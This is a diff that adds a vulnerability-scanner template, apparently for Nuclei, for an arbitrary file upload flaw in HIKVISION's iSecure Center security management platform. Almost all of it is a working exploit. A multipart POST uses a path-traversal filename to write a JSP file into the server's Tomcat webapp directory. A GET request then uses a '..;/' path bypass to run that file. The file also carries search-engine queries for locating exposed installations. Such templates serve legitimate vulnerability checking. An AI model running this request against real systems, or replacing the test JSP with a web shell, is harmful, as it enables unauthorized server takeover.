@@ -1,0 +1,42 @@
+id: HIKVISION-iSecure-Center-upload-report
+
+info:
+  name: HIKVISION-iSecure-Center-upload-report
+  author: hufei
+  severity: critical
+  description: |
+    HiKVISION 综合安防管理平台 report接口存在任意文件上传漏洞，攻击者通过构造特殊的请求包可以上传任意文件，获取服务器权限
+  reference:
+    - https://github.com/PeiQi0/PeiQi-WIKI-Book
+  metadata:
+    max-request: 2
+    fofa-query: app="HIKVISION-综合安防管理平台"
+    hunter-query: web.title=="综合安防管理平台
+    verified: False
+  tags: HIKVISION-iSecure-Center,fileupload,rce,intrusive
+
+http:
+  - raw:
+      - |
+        POST /svm/api/external/report HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.75 Safari/537.36
+        Content-Type: multipart/form-data; boundary=----WebKitFormBoundary9PggsiM755PLa54a
+
+        ------WebKitFormBoundary9PggsiM755PLa54a
+        Content-Disposition: form-data; name="file"; filename="../../../../../../../../../../../opt/hikvision/web/components/tomcat85linux64.1/webapps/eportal/new.jsp"
+        Content-Type: application/zip
+
+        <%out.print("123456");%>
+        ------WebKitFormBoundary9PggsiM755PLa54a--
+
+      - |
+        GET /portal/ui/login/..;/..;/new.jsp HTTP/1.1
+        Host: {{Hostname}}
+
+
+    matchers:
+      - type: word
+        part: body
+        words:
+          - '123456'
